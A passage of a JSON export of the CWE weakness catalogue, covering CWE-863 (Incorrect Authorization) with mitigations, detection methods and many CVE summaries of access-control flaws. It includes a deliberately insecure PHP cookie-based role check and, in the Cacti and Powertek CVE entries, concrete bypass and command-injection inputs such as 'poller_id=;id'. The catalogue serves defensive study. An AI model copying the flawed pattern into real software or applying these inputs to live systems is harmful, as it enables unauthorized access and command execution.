that the option mentioned in the notice param belongs to the plugin when processing requests to the cf7md_dismiss_notice action, allowing any logged in user (with roles as low as Subscriber) to set arbitrary options to true, potentially leading to Denial of Service by breaking the site."}, {"Reference": "CVE-2022-0837", "Description": "The Amelia WordPress plugin before 1.0.48 does not have proper authorisation when handling Amelia SMS service, allowing any customer to send paid test SMS notification as well as retrieve sensitive information about the admin, such as the email, account balance and payment history. A malicious actor can abuse this vulnerability to drain out the account balance by keep sending SMS notification."}, {"Reference": "CVE-2022-25342", "Description": "An issue was discovered on Olivetti d-COLOR MF3555 2XD_S000.002.271 devices. The Web Application is affected by Broken Access Control. It does not properly validate requests for access to data and functionality under the /mngset/authset path. By not verifying permissions for access to resources, it allows a potential attacker to view pages that are not allowed."}, {"Reference": "CVE-2022-33913", "Description": "In Mahara 21.04 before 21.04.6, 21.10 before 21.10.4, and 22.04.2, files can sometimes be downloaded through thumb.php with no permission check."}, {"Reference": "CVE-2022-30959", "Description": "A missing permission check in Jenkins SSH Plugin 2.6.1 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified SSH server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-3096", "Description": "The WP Total Hacks WordPress plugin through 4.7.2 does not prevent low privilege users from modifying the plugin's settings. This could allow users such as subscribers to perform Stored Cross-Site Scripting attacks against other users, like administrators, due to the lack of sanitisation and escaping as well."}, {"Reference": "CVE-2022-31752", "Description": "Missing authorization vulnerability in the system components. Successful exploitation of this vulnerability will affect confidentiality."}, {"Reference": "CVE-2022-31765", "Description": "Affected devices do not properly authorize the change password function of the web interface. This could allow low privileged users to escalate their privileges."}, {"Reference": "CVE-2022-3244", "Description": "The Import all XML, CSV & TXT WordPress plugin before 6.5.8 does not have authorisation in some places, which could allow any authenticated users to access some of the plugin features if they manage to get the related nonce"}, {"Reference": "CVE-2022-32966", "Description": "RTL8168FP-CG Dash remote management function has missing authorization. An unauthenticated attacker within the adjacent network can connect to DASH service port to disrupt service."}, {"Reference": "CVE-2022-3320", "Description": "It was possible to bypass policies configured for Zero Trust Secure Web Gateway by using warp-cli 'set-custom-endpoint' subcommand. Using this command with an unreachable endpoint caused the WARP Client to disconnect and allowed bypassing administrative restrictions on a Zero Trust enrolled endpoint. "}, {"Reference": "CVE-2022-3321", "Description": "It was possible to bypass Lock WARP switch feature https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/warp-settings/#lock-warp-switch on the WARP iOS mobile client by enabling both \"Disable for cellular networks\" and \"Disable for Wi-Fi networks\" switches at once in the application settings. Such configuration caused the WARP client to disconnect and allowed the user to bypass restrictions and policies enforced by the Zero Trust platform."}, {"Reference": "CVE-2022-3337", "Description": "It was possible for a user to delete a VPN profile from WARP mobile client on iOS platform despite the Lock WARP switch https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/warp-settings/#lock-warp-switch feature being enabled on Zero Trust Platform. This led to bypassing policies and restrictions enforced for enrolled devices by the Zero Trust platform. "}, {"Reference": "CVE-2022-34201", "Description": "A missing permission check in Jenkins Convertigo Mobile Platform Plugin 1.1 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL."}, {"Reference": "CVE-2022-34204", "Description": "A missing permission check in Jenkins EasyQA Plugin 1.0 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified HTTP server."}, {"Reference": "CVE-2022-34206", "Description": "A missing permission check in Jenkins Jianliao Notification Plugin 1.1 and earlier allows attackers with Overall/Read permission to send HTTP POST requests to an attacker-specified URL."}, {"Reference": "CVE-2022-34208", "Description": "A missing permission check in Jenkins Beaker builder Plugin 1.10 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL."}, {"Reference": "CVE-2022-34210", "Description": "A missing permission check in Jenkins ThreadFix Plugin 1.5.4 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL."}, {"Reference": "CVE-2022-34212", "Description": "A missing permission check in Jenkins vRealize Orchestrator Plugin 3.0 and earlier allows attackers with Overall/Read permission to send an HTTP POST request to an attacker-specified URL."}, {"Reference": "CVE-2022-3451", "Description": "The Product Stock Manager WordPress plugin before 1.0.5 does not have authorisation and proper CSRF checks in multiple AJAX actions, allowing users with a role as low as subscriber to call them. One action in particular could allow to update arbitrary options"}, {"Reference": "CVE-2022-34779", "Description": "A missing permission check in Jenkins XebiaLabs XL Release Plugin 22.0.0 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-34781", "Description": "Missing permission checks in Jenkins XebiaLabs XL Release Plugin 22.0.0 and earlier allow attackers with Overall/Read permission to connect to an attacker-specified HTTP server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-34785", "Description": "Jenkins build-metrics Plugin 1.3 and earlier does not perform permission checks in multiple HTTP endpoints, allowing attackers with Overall/Read permission to obtain information about jobs otherwise inaccessible to them."}, {"Reference": "CVE-2022-34794", "Description": "Missing permission checks in Jenkins Recipe Plugin 1.2 and earlier allow attackers with Overall/Read permission to send an HTTP request to an attacker-specified URL and parse the response as XML."}, {"Reference": "CVE-2022-0885", "Description": "The Member Hero WordPress plugin through 1.0.9 lacks authorization checks, and does not validate the a request parameter in an AJAX action, allowing unauthenticated users to call arbitrary PHP functions with no arguments."}, {"Reference": "CVE-2022-23642", "Description": "Sourcegraph is a code search and navigation engine. Sourcegraph prior to version 3.37 is vulnerable to remote code execution in the `gitserver` service. The service acts as a git exec proxy, and fails to properly restrict calling `git config`. This allows an attacker to set the git `core.sshCommand` option, which sets git to use the specified command instead of ssh when they need to connect to a remote system. Exploitation of this vulnerability depends on how Sourcegraph is deployed. An attacker able to make HTTP requests to internal services like gitserver is able to exploit it. This issue is patched in Sourcegraph version 3.37. As a workaround, ensure that requests to gitserver are properly protected."}, {"Reference": "CVE-2022-4223", "Description": "The pgAdmin server includes an HTTP API that is intended to be used to validate the path a user selects to external PostgreSQL utilities such as pg_dump and pg_restore. The utility is executed by the server to determine what PostgreSQL version it is from. Versions of pgAdmin prior to 6.17 failed to properly secure this API, which could allow an unauthenticated user to call it with a path of their choosing, such as a UNC path to a server they control on a Windows machine. This would cause an appropriately named executable in the target path to be executed by the pgAdmin server."}, {"Reference": "CVE-2022-41417", "Description": "BlogEngine.NET v3.3.8.0 allows an attacker to create any folder with \"files\" prefix under ~/App_Data/."}, {"Reference": "CVE-2022-0287", "Description": "The myCred WordPress plugin before 2.4.4.1 does not have any authorisation in place in its mycred-tools-select-user AJAX action, allowing any authenticated user, such as subscriber to call and retrieve all email addresses from the blog"}, {"Reference": "CVE-2022-0588", "Description": "Missing Authorization in Packagist librenms/librenms prior to 22.2.0. "}, {"Reference": "CVE-2022-31095", "Description": "discourse-chat is a chat plugin for the Discourse application. Versions prior to 0.4 are vulnerable to an exposure of sensitive information, where an attacker who knows the message ID for a channel they do not have access to can view that message using the chat message lookup endpoint, primarily affecting direct message channels. There are no known workarounds for this issue, and users are advised to update the plugin."}, {"Reference": "CVE-2022-32220", "Description": "An information disclosure vulnerability exists in Rocket.Chat <v5 due to the getUserMentionsByChannel meteor server method discloses messages from private channels and direct messages regardless of the users access permission to the room."}, {"Reference": "CVE-2022-35249", "Description": "A information disclosure vulnerability exists in Rocket.Chat <v5 where the getUserMentionsByChannel meteor server method discloses messages from private channels and direct messages regardless of the users access permission to the room."}, {"Reference": "CVE-2022-39222", "Description": "Dex is an identity service that uses OpenID Connect to drive authentication for other apps. Dex instances with public clients (and by extension, clients accepting tokens issued by those Dex instances) are affected by this vulnerability if they are running a version prior to 2.35.0. An attacker can exploit this vulnerability by making a victim navigate to a malicious website and guiding them through the OIDC flow, stealing the OAuth authorization code in the process. The authorization code then can be exchanged by the attacker for a token, gaining access to applications accepting that token. Version 2.35.0 has introduced a fix for this issue. Users are advised to upgrade. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-39289", "Description": "ZoneMinder is a free, open source Closed-circuit television software application. In affected versions the ZoneMinder API Exposes Database Log contents to user without privileges, allows insertion, modification, deletion of logs without System Privileges. Users are advised yo upgrade as soon as possible. Users unable to upgrade should disable database logging."}, {"Reference": "CVE-2022-46158", "Description": "PrestaShop is an open-source e-commerce solution. Versions prior to 1.7.8.8 did not properly restrict host filesystem access for users. Users may have been able to view the contents of the upload directory without appropriate permissions. This issue has been addressed and users are advised to upgrade to version 1.7.8.8. There are no known workarounds for this issue."}]}
{"ID": "863", "Name": "Incorrect Authorization", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.", "ExtendedDescription": "\n\nAssuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.\n\n\nWhen access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.\n", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "285", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "284", "ViewID": "1340", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "Web Server", "Prevalence": "Often"}, {"Type": "Technology", "Name": "Database Server", "Prevalence": "Often"}], "BackgroundDetails": ["An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."], "AlternateTerms": [{"Term": "AuthZ", "Description": "\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is distinct from \"AuthN\" (or, sometimes, \"AuthC\") which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "Authorization weaknesses may arise when a single-user application is ported to a multi-user environment."}, {"Phase": "Implementation", "Note": "\n\nREALIZATION: This weakness is caused during implementation of an architectural security tactic.\n\n\nA developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.\n"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"], "Note": "An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data", "Modify Files or Directories"], "Note": "An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."}, {"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity", "Bypass Protection Mechanism"], "Note": "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."}], "DetectionMethods": [{"DetectionMethodID": "DM-6", "Method": "Automated Static Analysis", "Description": "\n\nAutomated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.\n\n\nGenerally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.\n", "Effectiveness": "Limited"}, {"Method": "Automated Dynamic Analysis", "Description": "Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses."}, {"Method": "Manual Analysis", "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.\n", "Effectiveness": "Moderate", "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Automated Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tHost Application Interface Scanner\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tForced Path Execution\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "SOAR Partial"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.\n\n\nNote that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.\n"}, {"Phase": ["Architecture and Design"], "Description": "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7]."}, {"MitigationID": "MIT-4.4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].\n"}, {"Phase": ["Architecture and Design"], "Description": "\n\nFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.\n\n\nOne way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.\n"}, {"Phase": ["System Configuration", "Installation"], "Description": "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$role = $_COOKIES['role'];\n\tif (!$role) {\n\t\t$role = getRole('user');\n\t\tif ($role) {\n\t\t\t// save the cookie to send out in future responses\n\t\t\tsetcookie(\"role\", $role, time()+60*60*2);\n\t\t}\n\t\telse{\n\t\t\tShowLoginScreen();\n\t\t\tdie(\"\\n\");\n\t\t}\n\t}\n\tif ($role == 'Reader') {\n\t\tDisplayMedicalHistory($_POST['patient_ID']);\n\t}\n\telse{\n\t\tdie(\"You are not Authorized to view this record\\n\");\n\t}\n```"}, {"BodyText": "The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the \"role\" cookie to the value \"Reader\". As a result, the $role variable is \"Reader\", and getRole() is never invoked. The attacker has bypassed the authorization system."}]}], "ObservedExamples": [{"Reference": "CVE-2021-39155", "Description": "Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-39155"}, {"Reference": "CVE-2019-15900", "Description": "Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-15900"}, {"Reference": "CVE-2009-2213", "Description": "Gateway uses default \"Allow\" configuration for its authorization settings.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2213"}, {"Reference": "CVE-2009-0034", "Description": "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0034"}, {"Reference": "CVE-2008-6123", "Description": "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6123"}, {"Reference": "CVE-2008-7109", "Description": "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7109"}, {"Reference": "CVE-2008-3424", "Description": "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3424"}, {"Reference": "CVE-2008-4577", "Description": "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4577"}, {"Reference": "CVE-2006-6679", "Description": "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6679"}, {"Reference": "CVE-2005-2801", "Description": "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2801"}, {"Reference": "CVE-2001-1155", "Description": "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1155"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-30308", "Description": "In Festo Controller CECC-X-M1 product family in multiple versions, the http-endpoint \"cecc-x-web-viewer-request-on\" POST request doesn\u2019t check for port syntax. This can result in unauthorized execution of system commands with root privileges due to improper access control command injection. "}, {"Reference": "CVE-2022-30309", "Description": "In Festo Controller CECC-X-M1 product family in multiple versions, the http-endpoint \"cecc-x-web-viewer-request-off\" POST request doesn\u2019t check for port syntax. This can result in unauthorized execution of system commands with root privileges due to improper access control command injection. "}, {"Reference": "CVE-2022-30310", "Description": "In Festo Controller CECC-X-M1 product family in multiple versions, the http-endpoint \"cecc-x-acknerr-request\" POST request doesn\u2019t check for port syntax. This can result in unauthorized execution of system commands with root privileges due to improper access control command injection. "}, {"Reference": "CVE-2022-30311", "Description": "In Festo Controller CECC-X-M1 product family in multiple versions, the http-endpoint \"cecc-x-refresh-request\" POST request doesn\u2019t check for port syntax. This can result in unauthorized execution of system commands with root privileges due to improper access control command injection. "}, {"Reference": "CVE-2022-1589", "Description": "The Change wp-admin login WordPress plugin before 1.1.0 does not properly check for authorisation and is also missing CSRF check when updating its settings, which could allow unauthenticated users to change the settings. The attacked could also be performed via a CSRF vector"}, {"Reference": "CVE-2022-24730", "Description": "Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. Argo CD starting with version 1.3.0 but before versions 2.1.11, 2.2.6, and 2.3.0 is vulnerable to a path traversal bug, compounded by an improper access control bug, allowing a malicious user with read-only repository access to leak sensitive files from Argo CD's repo-server. A malicious Argo CD user who has been granted `get` access for a repository containing a Helm chart can craft an API request to the `/api/v1/repositories/{repo_url}/appdetails` endpoint to leak the contents of out-of-bounds files from the repo-server. The malicious payload would reference an out-of-bounds file, and the contents of that file would be returned as part of the response. Contents from a non-YAML file may be returned as part of an error message. The attacker would have to know or guess the location of the target file. Sensitive files which could be leaked include files from other Applications' source repositories or any secrets which have been mounted as files on the repo-server. This vulnerability is patched in Argo CD versions 2.1.11, 2.2.6, and 2.3.0. The patches prevent path traversal and limit access to users who either A) have been granted Application `create` privileges or B) have been granted Application `get` privileges and are requesting details for a `repo_url` that has already been used for the given Application. There are currently no known workarounds."}, {"Reference": "CVE-2022-3879", "Description": "The Car Dealer (Dealership) and Vehicle sales WordPress Plugin WordPress plugin before 3.05 does not have proper authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscriber to call it and install and activate arbitrary plugins from wordpress.org"}, {"Reference": "CVE-2022-3882", "Description": "The Memory Usage, Memory Limit, PHP and Server Memory Health Check and Fix Plugin WordPress plugin before 2.46 does not have proper authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscriber to call it and install and activate arbitrary plugins from wordpress.org"}, {"Reference": "CVE-2021-30533", "Description": "Insufficient policy enforcement in PopupBlocker in Google Chrome prior to 91.0.4472.77 allowed a remote attacker to bypass navigation restrictions via a crafted iframe."}, {"Reference": "CVE-2021-32648", "Description": "octobercms in a CMS platform based on the Laravel PHP Framework. In affected versions of the october/system package an attacker can request an account password reset and then gain access to the account using a specially crafted request. The issue has been patched in Build 472 and v1.1.5."}, {"Reference": "CVE-2021-3493", "Description": "The overlayfs implementation in the linux kernel did not properly validate with respect to user namespaces the setting of file capabilities on files in an underlying file system. Due to the combination of unprivileged user namespaces along with a patch carried in the Ubuntu kernel to allow unprivileged overlay mounts, an attacker could use this to gain elevated privileges."}, {"Reference": "CVE-2022-46169", "Description": "Cacti is an open source platform which provides a robust and extensible operational monitoring and fault management framework for users. In affected versions a command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti, if a specific data source was selected for any monitored device. The vulnerability resides in the `remote_agent.php` file. This file can be accessed without authentication. This function retrieves the IP address of the client via `get_client_addr` and resolves this IP address to the corresponding hostname via `gethostbyaddr`. After this, it is verified that an entry within the `poller` table exists, where the hostname corresponds to the resolved hostname. If such an entry was found, the function returns `true` and the client is authorized. This authorization can be bypassed due to the implementation of the `get_client_addr` function. The function is defined in the file `lib/functions.php` and checks serval `$_SERVER` variables to determine the IP address of the client. The variables beginning with `HTTP_` can be arbitrarily set by an attacker. Since there is a default entry in the `poller` table with the hostname of the server running Cacti, an attacker can bypass the authentication e.g. by providing the header `Forwarded-For: <TARGETIP>`. This way the function `get_client_addr` returns the IP address of the server running Cacti. The following call to `gethostbyaddr` will resolve this IP address to the hostname of the server, which will pass the `poller` hostname check because of the default entry. After the authorization of the `remote_agent.php` file is bypassed, an attacker can trigger different actions. One of these actions is called `polldata`. The called function `poll_for_data` retrieves a few request parameters and loads the corresponding `poller_item` entries from the database. If the `action` of a `poller_item` equals `POLLER_ACTION_SCRIPT_PHP`, the function `proc_open` is used to execute a PHP script. The attacker-controlled parameter `$poller_id` is retrieved via the function `get_nfilter_request_var`, which allows arbitrary strings. This variable is later inserted into the string passed to `proc_open`, which leads to a command injection vulnerability. By e.g. providing the `poller_id=;id` the `id` command is executed. In order to reach the vulnerable call, the attacker must provide a `host_id` and `local_data_id`, where the `action` of the corresponding `poller_item` is set to `POLLER_ACTION_SCRIPT_PHP`. Both of these ids (`host_id` and `local_data_id`) can easily be bruteforced. The only requirement is that a `poller_item` with an `POLLER_ACTION_SCRIPT_PHP` action exists. This is very likely on a productive instance because this action is added by some predefined templates like `Device - Uptime` or `Device - Polling Time`. This command injection vulnerability allows an unauthenticated user to execute arbitrary commands if a `poller_item` with the `action` type `POLLER_ACTION_SCRIPT_PHP` (`2`) is configured. The authorization bypass should be prevented by not allowing an attacker to make `get_client_addr` (file `lib/functions.php`) return an arbitrary IP address. This could be done by not honoring the `HTTP_...` `$_SERVER` variables. If these should be kept for compatibility reasons it should at least be prevented to fake the IP address of the server running Cacti. This vulnerability has been addressed in both the 1.2.x and 1.3.x release branches with `1.2.23` being the first release containing the patch."}, {"Reference": "CVE-2021-3956", "Description": "A read-only authentication bypass vulnerability was reported in the Third Quarter 2021 release of Lenovo XClarity Controller (XCC) firmware affecting XCC devices configured in LDAP Authentication Only Mode and using an LDAP server that supports \u201cunauthenticated bind\u201d, such as Microsoft Active Directory. An unauthenticated user can gain read-only access to XCC in such a configuration, thereby allowing the XCC device configuration to be viewed but not changed. XCC devices configured to use local authentication, LDAP Authentication + Authorization Mode, or LDAP servers that support only \u201cauthenticated bind\u201d and/or \u201canonymous bind\u201d are not affected."}, {"Reference": "CVE-2022-1983", "Description": "Incorrect authorization in GitLab EE affecting all versions from 10.7 prior to 14.10.5, 15.0 prior to 15.0.4, and 15.1 prior to 15.1.1, allowed an attacker already in possession of a valid Deploy Key or a Deploy Token to misuse it from any location to access Container Registries even when IP address restrictions were configured."}, {"Reference": "CVE-2022-27211", "Description": "A missing permission check in Jenkins Kubernetes Continuous Deploy Plugin 2.3.1 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified SSH server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-29271", "Description": "In Nagios XI through 5.8.5, a read-only Nagios user (due to an incorrect permission check) is able to schedule downtime for any host/services. This allows an attacker to permanently disable all monitoring checks."}, {"Reference": "CVE-2022-32226", "Description": "An improper access control vulnerability exists in Rocket.Chat <v5, <v4.8.2 and <v4.7.5 due to input data in the getUsersOfRoom Meteor server method is not type validated, so that MongoDB query operator objects are accepted by the server, so that instead of a matching rid String a$regex query can be executed, bypassing the room access permission check for every but the first matching room."}, {"Reference": "CVE-2022-34782", "Description": "An incorrect permission check in Jenkins requests-plugin Plugin 2.2.16 and earlier allows attackers with Overall/Read permission to view the list of pending requests."}, {"Reference": "CVE-2022-3819", "Description": "An improper authorization issue in GitLab CE/EE affecting all versions from 15.0 prior to 15.3.5, 15.4 prior to 15.4.4, and 15.5 prior to 15.5.2 allows a malicious users to set emojis on internal notes they don't have access to."}, {"Reference": "CVE-2022-40816", "Description": "Zammad 5.2.1 is vulnerable to Incorrect Access Control. Zammad's asset handling mechanism has logic to ensure that customer users are not able to see personal information of other users. This logic was not effective when used through a web socket connection, so that a logged-in attacker would be able to fetch personal data of other users by querying the Zammad API. This issue is fixed in , 5.2.2."}, {"Reference": "CVE-2022-45383", "Description": "An incorrect permission check in Jenkins Support Core Plugin 1206.v14049fa_b_d860 and earlier allows attackers with Support/DownloadBundle permission to download a previously created support bundle containing information limited to users with Overall/Administer permission."}, {"Reference": "CVE-2022-46076", "Description": "D-Link DIR-869 DIR869Ax_FW102B15 is vulnerable to Authentication Bypass via phpcgi."}, {"Reference": "CVE-2021-24917", "Description": "The WPS Hide Login WordPress plugin before 1.9.1 has a bug which allows to get the secret login page by setting a random referer string and making a request to /wp-admin/options.php as an unauthenticated user."}, {"Reference": "CVE-2022-1746", "Description": "The authentication mechanism used by poll workers to administer voting using the tested version of Dominion Voting Systems ImageCast X can expose cryptographic secrets used to protect election information. An attacker could leverage this vulnerability to gain access to sensitive information and perform privileged actions, potentially affecting other election equipment."}, {"Reference": "CVE-2022-22967", "Description": "An issue was discovered in SaltStack Salt in versions before 3002.9, 3003.5, 3004.2. PAM auth fails to reject locked accounts, which allows a previously authorized user whose account is locked still run Salt commands when their account is locked. This affects both local shell accounts with an active session and salt-api users that authenticate via PAM eauth."}, {"Reference": "CVE-2022-23822", "Description": "In this physical attack, an attacker may potentially exploit the Zynq-7000 SoC First Stage Boot Loader (FSBL) by bypassing authentication and loading a malicious image onto the device. This in turn may further allow the attacker to perform additional attacks such as such as using the device as a decryption oracle. An anticipated mitigation via a 2022.1 patch will resolve the issue."}, {"Reference": "CVE-2022-24778", "Description": "The imgcrypt library provides API exensions for containerd to support encrypted container images and implements the ctd-decoder command line tool for use by containerd to decrypt encrypted container images. The imgcrypt function `CheckAuthorization` is supposed to check whether the current used is authorized to access an encrypted image and prevent the user from running an image that another user previously decrypted on the same system. In versions prior to 1.1.4, a failure occurs when an image with a ManifestList is used and the architecture of the local host is not the first one in the ManifestList. Only the first architecture in the list was tested, which may not have its layers available locally since it could not be run on the host architecture. Therefore, the verdict on unavailable layers was that the image could be run anticipating that image run failure would occur later due to the layers not being available. However, this verdict to allow the image to run enabled other architectures in the ManifestList to run an image without providing keys if that image had previously been decrypted. A patch has been applied to imgcrypt 1.1.4. Workarounds may include usage of different namespaces for each remote user."}, {"Reference": "CVE-2022-33174", "Description": "Power Distribution Units running on Powertek firmware (multiple brands) before 3.30.30 allows remote authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext."}, {"Reference": "CVE-2021-22240", "Description": "Improper access control in 